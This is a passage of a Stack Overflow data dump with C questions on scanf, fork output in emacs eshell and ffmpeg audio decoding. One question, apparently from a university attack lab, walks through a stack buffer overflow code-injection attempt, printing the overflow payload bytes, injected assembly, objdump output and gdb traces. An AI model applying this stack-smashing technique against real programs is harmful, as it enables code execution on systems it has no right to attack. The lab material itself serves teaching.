1905, "user_id": 2094844, "user_type": "registered", "accept_rate": 54, "profile_image": "https://i.stack.imgur.com/NE8It.jpg?s=128&g=1", "display_name": "Sagar", "link": "https://stackoverflow.com/users/2094844/sagar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 49, "favorite_count": 0, "closed_date": 1476328105, "answer_count": 0, "score": 1, "last_activity_date": 1476313005, "creation_date": 1476313005, "question_id": 40009690, "link": "https://stackoverflow.com/questions/40009690/c-how-to-skip-rest-of-the-string-using-scanf", "closed_reason": "Duplicate", "title": "C - How to skip rest of the string using scanf?", "body": "<pre><code>9.9999          $ X\n16              $ Y = 2^4\n32              $ Y = 2^5\n</code></pre>\n\n<p>Or Input might be like this in file </p>\n\n<pre><code>9.99999         $ X some string will be here \n25000000        $ Y = some numbers or string \n2500            $ Y = some numbers or string\n</code></pre>\n\n<p>Now I want to only scan first column number's as double and integer using scanf in C. How to do that ? </p>\n"}, {"tags": ["c", "printf", "fork"], "comments": [{"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1476311169, "post_id": 40009353, "comment_id": 67296870, "body": "What system are you compiling for?  Your code works as expected on OS/X"}, {"owner": {"reputation": 14050, "user_id": 3772221, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/xfx4l.png?s=128&g=1", "display_name": "m0meni", "link": "https://stackoverflow.com/users/3772221/m0meni"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1476311270, "post_id": 40009353, "comment_id": 67296903, "body": "I&#39;m on OSX 10.11. Will put more details in question."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1476311452, "post_id": 40009353, "comment_id": 67296980, "body": "I am running 10.11.6 with a slightly older version of LLVM (7.0.0) and your code behaves as expected."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 2, "creation_date": 1476311504, "post_id": 40009353, "comment_id": 67297003, "body": "Do you run the program in the terminal or redirect its output or somehow run it inside an IDE?"}, {"owner": {"reputation": 14050, "user_id": 3772221, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/xfx4l.png?s=128&g=1", "display_name": "m0meni", "link": "https://stackoverflow.com/users/3772221/m0meni"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 2, "creation_date": 1476311589, "post_id": 40009353, "comment_id": 67297026, "body": "@chqrlie that was it...I was running it in emacs <code>eshell</code>, which in hindsight was dumb."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1476311661, "post_id": 40009353, "comment_id": 67297050, "body": "Use qemacs instead ;-) it has a better shell mode."}, {"owner": {"reputation": 14050, "user_id": 3772221, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/xfx4l.png?s=128&g=1", "display_name": "m0meni", "link": "https://stackoverflow.com/users/3772221/m0meni"}, "reply_to_user": {"reputation": 13521, "user_id": 654953, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/f6453f58b70e93dbfa8998b71a95bb09?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan", "link": "https://stackoverflow.com/users/654953/ryan"}, "edited": false, "score": 0, "creation_date": 1476311720, "post_id": 40009353, "comment_id": 67297070, "body": "@self I wouldn&#39;t say it was nonsensical. The problem was real, but just an issue with environment...not code."}], "answers": [{"comments": [{"owner": {"reputation": 5768, "user_id": 3088572, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/769f723b0fd6eb8c99d5f65b39392b18?s=128&d=identicon&r=PG&f=1", "display_name": "alvits", "link": "https://stackoverflow.com/users/3088572/alvits"}, "edited": false, "score": 0, "creation_date": 1476312136, "post_id": 40009494, "comment_id": 67297181, "body": "I think some IDE provides their own libraries for debugging purposes, much like valgrind provides their own except it isn&#39;t an IDE. Their provided library may not have a full blown fork()."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 5768, "user_id": 3088572, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/769f723b0fd6eb8c99d5f65b39392b18?s=128&d=identicon&r=PG&f=1", "display_name": "alvits", "link": "https://stackoverflow.com/users/3088572/alvits"}, "edited": false, "score": 1, "creation_date": 1476312307, "post_id": 40009494, "comment_id": 67297232, "body": "@alvits: emacs does not provide a library, it runs the program compiled by clang but the way it captures the output works differently from what happens in the terminal window. It should be considered a bug."}, {"owner": {"reputation": 5768, "user_id": 3088572, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/769f723b0fd6eb8c99d5f65b39392b18?s=128&d=identicon&r=PG&f=1", "display_name": "alvits", "link": "https://stackoverflow.com/users/3088572/alvits"}, "edited": false, "score": 0, "creation_date": 1476313993, "post_id": 40009494, "comment_id": 67297679, "body": "You are absolutely right. While emacs doesn&#39;t provide its own set of development libraries, the OP mentioned <code>eshell</code> which I believe is built for emacs. This <code>eshell</code> is what I was thinking that might contain libraries as it provides most interface that a regular shell does. I have not used <code>eshell</code>, hence <i>I believe</i>."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1476344202, "post_id": 40009494, "comment_id": 67307154, "body": "Several emacs packages implement a shell buffer: <code>eshell</code> is a builtin shell that does not rely on the unix shell, bash or other. It has its own command line parser and implements I/O redirection in a way that seems incorrect or incomplete. The emacs <code>shell</code> command uses virtual ttys and runs the unix shell in manner more compatible with the unix terminals, except it does not implement escape sequences, hence it behaves as a <i>dumb</i> terminal.  <code>qemacs</code> also uses virtual ttys and implements VT100 escape sequences in its terminal emulation: you can even run emacs inside the qemacs process window."}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 2, "last_activity_date": 1476311785, "creation_date": 1476311785, "answer_id": 40009494, "question_id": 40009353, "link": "https://stackoverflow.com/questions/40009353/printf-only-printing-once-after-fork-in-two-line-program/40009494#40009494", "title": "Printf only printing once after fork in two-line program", "body": "<p>Your program should indeed output both lines in any given order.  Running it in the terminal would do that.  Running it in some quirky environment such as emacs' eshell window may have surprising side effects such as what you experienced.</p>\n"}], "owner": {"reputation": 14050, "user_id": 3772221, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/xfx4l.png?s=128&g=1", "display_name": "m0meni", "link": "https://stackoverflow.com/users/3772221/m0meni"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 292, "favorite_count": 0, "accepted_answer_id": 40009494, "answer_count": 1, "score": 0, "last_activity_date": 1476311785, "creation_date": 1476310983, "last_edit_date": 1476311300, "question_id": 40009353, "link": "https://stackoverflow.com/questions/40009353/printf-only-printing-once-after-fork-in-two-line-program", "title": "Printf only printing once after fork in two-line program", "body": "<p>I have a two-line program to print the id of the processes after the fork. I expect some number such as <code>66015</code> for the parent process, and <code>0</code> for the child process.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n  pid_t id = fork();\n  printf(\"id: %i\\n\", id);\n}\n</code></pre>\n\n<p>However the program only prints</p>\n\n<pre><code>id: 66015\n</code></pre>\n\n<p>And does not include the line</p>\n\n<pre><code>id: 0\n</code></pre>\n\n<p>Could someone explain what's going on? I'm relatively new to <code>C</code> and <code>fork</code>.</p>\n\n<p>I'm on OSX 10.11, and <code>gcc --version</code> prints</p>\n\n<pre><code>Configured with: --prefix=/Applications/Xcode.app/Contents/Developer/usr --with-gxx-include-dir=/usr/include/c++/4.2.1\nApple LLVM version 8.0.0 (clang-800.0.38)\nTarget: x86_64-apple-darwin15.6.0\nThread model: posix\nInstalledDir: /Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin\n</code></pre>\n"}, {"tags": ["c", "assembly", "buffer-overflow"], "comments": [{"owner": {"reputation": 40086, "user_id": 499581, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1ba2cebc4582467916f2ddd6128447f4?s=128&d=identicon&r=PG", "display_name": "l&#39;L&#39;l", "link": "https://stackoverflow.com/users/499581/lll"}, "edited": false, "score": 0, "creation_date": 1476311478, "post_id": 40009334, "comment_id": 67296989, "body": "Why don&#39;t you run it in a debugger? That&#39;s likely going to tell you right where it seg faults."}, {"owner": {"reputation": 1933, "user_id": 5449456, "user_type": "registered", "accept_rate": 52, "profile_image": "https://lh5.googleusercontent.com/-2pNZV5O6iBo/AAAAAAAAAAI/AAAAAAAAAEk/eEtyVSBbwSk/photo.jpg?sz=128", "display_name": "Kendall Weihe", "link": "https://stackoverflow.com/users/5449456/kendall-weihe"}, "reply_to_user": {"reputation": 40086, "user_id": 499581, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1ba2cebc4582467916f2ddd6128447f4?s=128&d=identicon&r=PG", "display_name": "l&#39;L&#39;l", "link": "https://stackoverflow.com/users/499581/lll"}, "edited": false, "score": 0, "creation_date": 1476312462, "post_id": 40009334, "comment_id": 67297282, "body": "I tried that. It asks me to enter a string, so I converted the raw input to a ASCII string (I&#39;ll update the post with this info) then entered the string. When I executed <code>nexti</code> after the <code>retq</code> instruction in <code>getbuf()</code> it seg faults. Which makes no sense, because the adress is correct and it&#39;s literally the next 8 bytes. I also tried different ordering for the instructions."}, {"owner": {"reputation": 40086, "user_id": 499581, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1ba2cebc4582467916f2ddd6128447f4?s=128&d=identicon&r=PG", "display_name": "l&#39;L&#39;l", "link": "https://stackoverflow.com/users/499581/lll"}, "edited": false, "score": 0, "creation_date": 1476315076, "post_id": 40009334, "comment_id": 67297926, "body": "I see... maybe try using a <code>leaveq</code> ( <code>c9</code> ) before returning ( it seems to work well with overflows ). I marked a similar question to yours a while back that is really well constructed also \u2014 It might be worth a look at if you haven&#39;t happened to see it already. ( <a href=\"http://stackoverflow.com/questions/11506799/stack-resident-buffer-overflow-on-64-bit\" title=\"stack resident buffer overflow on 64 bit\">stackoverflow.com/questions/11506799/&hellip;</a> )"}], "owner": {"reputation": 1933, "user_id": 5449456, "user_type": "registered", "accept_rate": 52, "profile_image": "https://lh5.googleusercontent.com/-2pNZV5O6iBo/AAAAAAAAAAI/AAAAAAAAAEk/eEtyVSBbwSk/photo.jpg?sz=128", "display_name": "Kendall Weihe", "link": "https://stackoverflow.com/users/5449456/kendall-weihe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1712, "favorite_count": 0, "answer_count": 0, "score": 4, "last_activity_date": 1476312759, "creation_date": 1476310885, "last_edit_date": 1476312759, "question_id": 40009334, "link": "https://stackoverflow.com/questions/40009334/buffer-overflow-execute-exploit-assembly-placed-on-the-stack", "title": "Buffer overflow execute exploit assembly -- placed on the stack", "body": "<p>I need <code>getbuf()</code> to call <code>touch2()</code> with the correct parameter through a buffer overflow exploit. I will replace the parameter through exploit code -- placing instructions on the stack that places the value of <code>cookie</code> into the <code>%rdi</code> register.</p>\n\n<p><code>getbuf()</code> looks like this...</p>\n\n<pre><code>  4 int getbuf() {\n  6     char buf[BUFFER_SIZE];\n  7     Gets(buf);\n  8     return 1;\n  9 }\n</code></pre>\n\n<p><code>touch2()</code> looks like this...</p>\n\n<pre><code>void touch2(unsigned val) {\n    vlevel = 2;       /* Part of validation protocol */\n    if (val == cookie) {\n        printf(\"Touch2!: You called touch2(0x%.8x)\\n\", val);\n        validate(2);\n    } else {\n        printf(\"Misfire: You called touch2(0x%.8x)\\n\", val);\n        fail(2);\n    }\n    exit(0);\n}\n</code></pre>\n\n<p>I know the value of cookie is: <code>Cookie: 0x54756825</code></p>\n\n<p>I have a program called <code>hex2raw</code> that reads in a text file containing hex characters and converts them to raw binary data. Therefore I can run the attack through the following command: <code>./hex2raw &lt; exploit.txt | ./ctarget</code> Where <code>ctarget</code> is the main program. </p>\n\n<p>The assembly code for <code>getbuf()</code> looks like this...</p>\n\n<pre><code>000000000040194a &lt;getbuf&gt;:\n  40194a:   48 83 ec 38             sub    $0x38,%rsp\n  40194e:   48 89 e7                mov    %rsp,%rdi\n  401951:   e8 8a 02 00 00          callq  401be0 &lt;Gets&gt;\n  401956:   b8 01 00 00 00          mov    $0x1,%eax\n  40195b:   48 83 c4 38             add    $0x38,%rsp\n  40195f:   c3                      retq   \n</code></pre>\n\n<p>I know that the size of the stack frame is <code>0x38</code> so inside my <code>exploit.txt</code> file I could have something like:</p>\n\n<pre><code>00 00 00 00 00 00\n00 00 00 00 00 00\n00 00 00 00 00 00\n00 00 00 00 00 00\n00 00 00 00 00 00\n00 00 00 00 00 00\n00 00 00 00 00 00\n00 00 00 00 00 00\n/* at this point there is no seg fault */\n00 00 00 00 00 00 00 00 /* 8 byte old rbp */\n60 19 40 00 00 00 00 00 /* 8 bytes address */\n</code></pre>\n\n<p>...and this will result in <code>getbuf()</code> returning to the function at address <code>401960</code>.</p>\n\n<p>However, I need to do much more than that. The general process for my exploit is like so:</p>\n\n<ul>\n<li>overflow buffer</li>\n<li>place address in return address space that is directly above the stack frame (check out page 9 <a href=\"https://www.exploit-db.com/docs/28475.pdf\" rel=\"nofollow\">here</a>)</li>\n<li>place raw binary instructions above the return address space -- such that the program counter is now pointing to my exploit code on the stack</li>\n</ul>\n\n<p>I already know how to cause <code>getbuf()</code> to return to a different function (in the above exploit code). So now I need to overflow the buffer and place the address of the 8 bytes directly above the return address space into the return address space.</p>\n\n<p>I can do that by simply adding 8 bytes to the address pointed to by the <code>%rsp</code> register at the beginning of <code>getbuf()</code>. I can find this value through gdb...</p>\n\n<pre><code>(gdb) b *0x40194a\nBreakpoint 1 at 0x40194a: file buf.c, line 12.\n(gdb) r\nStarting program: /home/kmwe236/CS485/prog3/target26/ctarget \nCookie: 0x54756825\n\nBreakpoint 1, getbuf () at buf.c:12\n12  buf.c: No such file or directory.\n(gdb) x/x ($rsp)\n0x556387f0: 0x00401b16\n</code></pre>\n\n<p>So the address placed in the return address space should be <code>0x556387f8</code>.</p>\n\n<p>Next I need to add the assembly code, so I compile the following code and then use <code>objdump</code> to view the hex values...</p>\n\n<pre><code>movq $0x0000000054756825, %rdi\nmovq $0x000000000040198c, 0x0000000055638800 ; move the address of `touch2()` into a place on the stack\nmovq $0x0000000055638800, %rbp ; move that address place into the tbp register -- used for the retq instruction\nretq\n</code></pre>\n\n<p>Compile...</p>\n\n<pre><code>kmwe236@kmwe236:~/CS485/prog3/target26$ gcc -c level2.s \nkmwe236@kmwe236:~/CS485/prog3/target26$ objdump -d level2.o &gt; level2.txt\nkmwe236@kmwe236:~/CS485/prog3/target26$ cat level2.txt \n\nlevel2.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;.text&gt;:\n   0:   48 c7 c7 25 68 75 54    mov    $0x54756825,%rdi\n   7:   48 c7 04 25 00 88 63    movq   $0x40198c,0x55638800\n   e:   55 8c 19 40 00 \n  13:   48 c7 c5 00 88 63 55    mov    $0x55638800,%rbp\n  1a:   c3                      retq   \n</code></pre>\n\n<p>Finally it's time to construct the <code>exploit.txt</code> file... so here's what I have... (note comments are allowed)</p>\n\n<pre><code>kmwe236@kmwe236:~/CS485/prog3/target26$ cat exploit2.txt \n\n00 00 00 00 00 00 00 00 \n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n\n00 00 00 00 00 00 00 00 /* 8 byte old rbp */\nf8 87 63 55 00 00 00 00 /* 8 bytes address */ \n\n54 75 68 25 c7 c7 48 00 /* begin instructions */\n63 88 00 25 04 c7 48 00\n00 40 19 8c 55 00 00 00\n55 63 88 00 c5 c7 48 00\nc3 00 00 00 00 00 00 00\n</code></pre>\n\n<p>This causes a seg fault. I'm missing something small I know it.</p>\n\n<p>I tried using GDB to find out exactly where it seg faults. The program asks me to enter a string, so I converted the raw data into a ASCII string like so...</p>\n\n<pre><code>kmwe236@kmwe236:~/CS485/prog3/target26$ ./hex2raw &lt; exploit2.txt &gt; temp\nkmwe236@kmwe236:~/CS485/prog3/target26$ base64 &lt; temp &gt; temp.txt\nkmwe236@kmwe236:~/CS485/prog3/target26$ cat temp.txt\nAEjHxyVodVQASMcEJQCIYwAAAFWMGUAAAEjHxQCIY1UAAAAAAAAAwwAAAAAAAAAAAAAAAAAAAAD4\nh2NVAAAAAFR1aCXHx0gAY4gAJQTHSAAAQBmMVQAAAFVjiADFx0gAwwAAAAAAAAAK\n</code></pre>\n\n<p>I'm guessing there's a <code>\\n</code> in there, so the actual string is <code>AEjHxyVodVQASMcEJQCIYwAAAFWMGUAAAEjHxQCIY1UAAAAAAAAAwwAAAAAAAAAAAAAAAAAAAAD4\\nh2NVAAAAAFR1aCXHx0gAY4gAJQTHSAAAQBmMVQAAAFVjiADFx0gAwwAAAAAAAAAK</code></p>\n\n<p>So then I ran GDB like so... it seg fault after the <code>retq</code> instruction in <code>getbuf()</code> as if the address literally 8 bytes above is an illegal place?</p>\n\n<pre><code>(gdb) r\nStarting program: /home/kmwe236/CS485/prog3/target26/ctarget\nCookie: 0x54756825\n\nBreakpoint 1, getbuf () at buf.c:12\n12  buf.c: No such file or directory.\n(gdb) nexti\n14  in buf.c\n(gdb) nexti\n0x0000000000401951  14  in buf.c\n(gdb) nexti\nType string:AEjHxyVodVQASMcEJQCIYwAAAFWMGUAAAEjHxQCIY1UAAAAAAAAAwwAAAAAAAAAAAAAAAAAAAAD4\\nh2NVAAAAAFR1aCXHx0gAY4gAJQTHSAAAQBmMVQAAAFVjiADFx0gAwwAAAAAAAAAK\n16  in buf.c\n(gdb) nexti\n0x000000000040195b  16  in buf.c\n(gdb) nexti\n0x000000000040195f  16  in buf.c\n(gdb) nexti\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x000000000040195f in getbuf () at buf.c:16\n16  in buf.c\n</code></pre>\n\n<p>Asking GDB <code>where</code> gives me this...</p>\n\n<pre><code>(gdb) where\n#0  0x000000000040195f in getbuf () at buf.c:16\n#1  0x4141414141414141 in ?? ()\n#2  0x4141414141414141 in ?? ()\n#3  0x32686e5c34444141 in ?? ()\n#4  0x464141414141564e in ?? ()\n#5  0x3078485843613152 in ?? ()\n#6  0x514a416734594167 in ?? ()\n#7  0x4251414141534854 in ?? ()\n#8  0x4641414151564d6d in ?? ()\n#9  0x3078464441696a56 in ?? ()\n#10 0x4141414177774167 in ?? ()\n#11 0xf4004b4141414141 in ?? ()\n#12 0xf4f4f4f4f4f4f4f4 in ?? ()\n#13 0xf4f4f4f4f4f4f4f4 in ?? ()\n#14 0xf4f4f4f4f4f4f4f4 in ?? ()\n#15 0xf4f4f4f4f4f4f4f4 in ?? ()\n#16 0xf4f4f4f4f4f4f4f4 in ?? ()\n#17 0xf4f4f4f4f4f4f4f4 in ?? ()\n#18 0xf4f4f4f4f4f4f4f4 in ?? ()\n#19 0xf4f4f4f4f4f4f4f4 in ?? ()\n#20 0xf4f4f4f4f4f4f4f4 in ?? ()\n#21 0xf4f4f4f4f4f4f4f4 in ?? ()\n#22 0xf4f4f4f4f4f4f4f4 in ?? ()\n#23 0xf4f4f4f4f4f4f4f4 in ?? ()\n#24 0xf4f4f4f4f4f4f4f4 in ?? ()\n#25 0xf4f4f4f4f4f4f4f4 in ?? ()\n#26 0xf4f4f4f4f4f4f4f4 in ?? ()\n#27 0xf4f4f4f4f4f4f4f4 in ?? ()\n#28 0xf4f4f4f4f4f4f4f4 in ?? ()\n#29 0xf4f4f4f4f4f4f4f4 in ?? ()\n#30 0xf4f4f4f4f4f4f4f4 in ?? ()\n#31 0xf4f4f4f4f4f4f4f4 in ?? ()\n#32 0xf4f4f4f4f4f4f4f4 in ?? ()\n#33 0xf4f4f4f4f4f4f4f4 in ?? ()\n#34 0xf4f4f4f4f4f4f4f4 in ?? ()\n#35 0xf4f4f4f4f4f4f4f4 in ?? ()\n#36 0xf4f4f4f4f4f4f4f4 in ?? ()\n#37 0xf4f4f4f4f4f4f4f4 in ?? ()\n#38 0xf4f4f4f4f4f4f4f4 in ?? ()\n#39 0xf4f4f4f4f4f4f4f4 in ?? ()\n#40 0xf4f4f4f4f4f4f4f4 in ?? ()\n#41 0xf4f4f4f4f4f4f4f4 in ?? ()\n#42 0xf4f4f4f4f4f4f4f4 in ?? ()\n#43 0xf4f4f4f4f4f4f4f4 in ?? ()\n#44 0xf4f4f4f4f4f4f4f4 in ?? ()\n#45 0xf4f4f4f4f4f4f4f4 in ?? ()\n#46 0xf4f4f4f4f4f4f4f4 in ?? ()\n#47 0xf4f4f4f4f4f4f4f4 in ?? ()\n#48 0xf4f4f4f4f4f4f4f4 in ?? ()\n#49 0xf4f4f4f4f4f4f4f4 in ?? ()\n#50 0xf4f4f4f4f4f4f4f4 in ?? ()\n#51 0xf4f4f4f4f4f4f4f4 in ?? ()\n</code></pre>\n"}, {"tags": ["c", "ffmpeg"], "comments": [{"owner": {"reputation": 1637, "user_id": 6909048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af2db37ccd50ab0fb72ce3532577b50b?s=128&d=identicon&r=PG", "display_name": "Andrey Turkin", "link": "https://stackoverflow.com/users/6909048/andrey-turkin"}, "edited": false, "score": 0, "creation_date": 1476322483, "post_id": 40009271, "comment_id": 67299724, "body": "Please provide some example of the errors you are getting."}, {"owner": {"reputation": 11, "user_id": 6038550, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99bf40badc974553c6d398d81a561c6e?s=128&d=identicon&r=PG&f=1", "display_name": "USER 556", "link": "https://stackoverflow.com/users/6038550/user-556"}, "reply_to_user": {"reputation": 1637, "user_id": 6909048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af2db37ccd50ab0fb72ce3532577b50b?s=128&d=identicon&r=PG", "display_name": "Andrey Turkin", "link": "https://stackoverflow.com/users/6909048/andrey-turkin"}, "edited": false, "score": 0, "creation_date": 1476349331, "post_id": 40009271, "comment_id": 67310268, "body": "Error\tLNK2019\tunresolved external symbol _avcodec_alloc_context3 referenced in function &quot;void __cdecl audioDecode(char *)&quot; (?audioDecode@@YAXPAD@Z)"}, {"owner": {"reputation": 1637, "user_id": 6909048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af2db37ccd50ab0fb72ce3532577b50b?s=128&d=identicon&r=PG", "display_name": "Andrey Turkin", "link": "https://stackoverflow.com/users/6909048/andrey-turkin"}, "edited": false, "score": 0, "creation_date": 1476351542, "post_id": 40009271, "comment_id": 67311711, "body": "And you are linking to avcodec, avformat and avutil libraries, right? With correct names for your ffmpeg installation?"}, {"owner": {"reputation": 11, "user_id": 6038550, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99bf40badc974553c6d398d81a561c6e?s=128&d=identicon&r=PG&f=1", "display_name": "USER 556", "link": "https://stackoverflow.com/users/6038550/user-556"}, "reply_to_user": {"reputation": 1637, "user_id": 6909048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af2db37ccd50ab0fb72ce3532577b50b?s=128&d=identicon&r=PG", "display_name": "Andrey Turkin", "link": "https://stackoverflow.com/users/6909048/andrey-turkin"}, "edited": false, "score": 0, "creation_date": 1476351662, "post_id": 40009271, "comment_id": 67311783, "body": "Yes, I am doing it properly as I did for my other ffmpeg projects. Then also I am getting this error."}, {"owner": {"reputation": 11, "user_id": 6038550, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99bf40badc974553c6d398d81a561c6e?s=128&d=identicon&r=PG&f=1", "display_name": "USER 556", "link": "https://stackoverflow.com/users/6038550/user-556"}, "reply_to_user": {"reputation": 1637, "user_id": 6909048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af2db37ccd50ab0fb72ce3532577b50b?s=128&d=identicon&r=PG", "display_name": "Andrey Turkin", "link": "https://stackoverflow.com/users/6909048/andrey-turkin"}, "edited": false, "score": 0, "creation_date": 1476355185, "post_id": 40009271, "comment_id": 67314217, "body": "Thank you for your help. I got rid of those errors, but still I was not able to decode the audio file. The file which I want to decode is a mp2 file. Can you please tell me if anything is wrong with the code?"}, {"owner": {"reputation": 1637, "user_id": 6909048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af2db37ccd50ab0fb72ce3532577b50b?s=128&d=identicon&r=PG", "display_name": "Andrey Turkin", "link": "https://stackoverflow.com/users/6909048/andrey-turkin"}, "edited": false, "score": 0, "creation_date": 1476358516, "post_id": 40009271, "comment_id": 67316434, "body": "One obvious thing is that you receive encoded packets in <code>pkt</code> but then give empty <code>encodePacket</code> into codec. Second thing is that you write encoded packets into file instead of decoded."}, {"owner": {"reputation": 11, "user_id": 6038550, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99bf40badc974553c6d398d81a561c6e?s=128&d=identicon&r=PG&f=1", "display_name": "USER 556", "link": "https://stackoverflow.com/users/6038550/user-556"}, "reply_to_user": {"reputation": 1637, "user_id": 6909048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af2db37ccd50ab0fb72ce3532577b50b?s=128&d=identicon&r=PG", "display_name": "Andrey Turkin", "link": "https://stackoverflow.com/users/6909048/andrey-turkin"}, "edited": false, "score": 0, "creation_date": 1476358819, "post_id": 40009271, "comment_id": 67316628, "body": "Hi Mr.Andrey, This is my updated code. I still get the problem near fwrite, can you please tell me if I am making some mistake?"}, {"owner": {"reputation": 1637, "user_id": 6909048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af2db37ccd50ab0fb72ce3532577b50b?s=128&d=identicon&r=PG", "display_name": "Andrey Turkin", "link": "https://stackoverflow.com/users/6909048/andrey-turkin"}, "edited": false, "score": 0, "creation_date": 1476359057, "post_id": 40009271, "comment_id": 67316793, "body": "Assuming you want to write decoded audio: you still writing encoded packet. You need to write decoded data which <code>avcodec_receive_frame</code> placed into <code>decodeFrame</code>. Also you are reopening output file every time so each new frame gets written into same place in file. There are some smaller issues with the code but they probably don&#39;t matter for this particular case."}, {"owner": {"reputation": 11, "user_id": 6038550, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99bf40badc974553c6d398d81a561c6e?s=128&d=identicon&r=PG&f=1", "display_name": "USER 556", "link": "https://stackoverflow.com/users/6038550/user-556"}, "reply_to_user": {"reputation": 1637, "user_id": 6909048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af2db37ccd50ab0fb72ce3532577b50b?s=128&d=identicon&r=PG", "display_name": "Andrey Turkin", "link": "https://stackoverflow.com/users/6909048/andrey-turkin"}, "edited": false, "score": 0, "creation_date": 1476360636, "post_id": 40009271, "comment_id": 67317886, "body": "Thank you. My aim to decode mp2 file to pcm format and then I want to extend this to achieve transcoding along with the encoding. So now do I have to send my decodeFrame to fwrite() ??"}], "answers": [{"tags": [], "owner": {"reputation": 1076, "user_id": 2979092, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/d2hLQ.jpg?s=128&g=1", "display_name": "WLGfx", "link": "https://stackoverflow.com/users/2979092/wlgfx"}, "is_accepted": false, "score": 0, "last_activity_date": 1476367323, "creation_date": 1476367323, "answer_id": 40023194, "question_id": 40009271, "link": "https://stackoverflow.com/questions/40009271/how-to-get-rid-of-unresolved-external-errors-while-trying-to-decode-audio-using/40023194#40023194", "title": "How to get rid of unresolved external errors while trying to decode audio using ffmpeg", "body": "<p>I'm just going to assume that you've already connected to the stream source and have the codec context by what you've mentioned in the comments.</p>\n\n<p>These are snippets from my own project decoding the audio frames.</p>\n\n<p>Decode the audio packet:</p>\n\n<pre><code>void FFMPEG::process_audio_packet(AVPacket *pkt) {\n    int got;\n    avcodec_decode_audio4(aud_stream.context, aud_stream.frame, &amp;got, pkt);\n    if (got) Audio.add_av_frame(aud_stream.frame);\n}\n</code></pre>\n\n<p>Process the completed frame and extract a stereo 16 bit signed 